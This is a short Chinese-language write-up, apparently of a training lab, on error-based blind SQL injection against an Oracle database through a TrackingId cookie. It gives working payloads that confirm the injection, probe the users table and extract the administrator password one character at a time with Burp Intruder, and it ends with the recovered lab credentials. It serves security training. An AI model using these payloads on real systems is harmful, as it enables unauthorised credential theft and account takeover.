修改的参数是Cookie的值
①找到是否存在注入点
```SQL
TrackingId=xyz'   --报错
TrackingId=xyz''  --不报错
```
②确定是不是Oracle
```SQL
TrackingId=xyz'||(SELECT '')||' --报错
TrackingId=xyz'||(SELECT ''FROM DUAL)||' --不报错
```
报错证明是Oracle数据库，要用到DUAL这个特殊的表
③验证users表的确存在
```SQL
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```
④检验选择结构能否使用
```SQL
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
其中TO_CAHR()函数，将括号内的东东转化为字符串，由于1/0明显不合法，故会直接报错
```SQL
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
执行空操作，不会报错
⑤看用户名administrastor是否真正存在
```SQL
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
报错，证明存在
⑥找到密码的长度
```SQL
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
1逐渐增加，直到不报错为止
⑦逐位确定密码
```SQL
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

放入Intruder并为a加上负载
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
administrator
wqfaz8r1p9ac5qcabx8f